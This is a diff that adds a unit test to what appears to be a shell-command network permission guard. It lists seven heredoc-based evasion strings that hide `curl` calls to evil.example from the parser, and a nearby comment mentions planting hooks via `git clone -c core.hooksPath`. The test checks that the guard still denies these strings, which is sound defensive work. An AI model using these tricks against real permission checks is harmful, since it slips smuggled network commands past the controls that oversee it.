@@ -375,6 +375,22 @@ describe('networkAllowedFor', () => {
     expect(networkDecision(sighted)).toEqual({ allowed: true });
   });
 
+  // Review of #693, each run against `/bin/sh`: a body the reader ended LATER than the shell hid the
+  // `curl` after it from the verb read, and an escaped `<` hid a heredoc from the mask guard.
+  it('keeps the deny when a heredoc reader could disagree with the shell', () => {
+    for (const cmd of [
+      "git log \\<<<git\ngit log '$(curl https://evil.example/x)'\ngit",
+      'git log - <<\\EOF"x"\nEOFx\ncurl https://evil.example\nEOF',
+      'git log - <<"EOF"x\nEOFx\ncurl https://evil.example\nEOF',
+      "git log - <<'EOF'x\nEOFx\ncurl https://evil.example\nEOF",
+      'git log - <<END-X\nEND-X\ncurl https://evil.example\nEND',
+      "git log --grep '<<EOF'\ncurl https://evil.example\nEOF",
+      'gh issue view 1 --body-file - <<EOF && curl https://evil.example\nbody\nEOF',
+    ]) {
+      expect(networkAllowedFor(cmd)).toBe(false);
+    }
+  });
+
   // The one subcommand whose own `-c` IS a config flag: `git clone -c/--config <key=value>` sets
   // config in the new repo before the remote fetch (`core.sshCommand`) and its hooks run at checkout
   // (`core.hooksPath`) — verified by planting a post-checkout through `git clone -c core.hooksPath`.
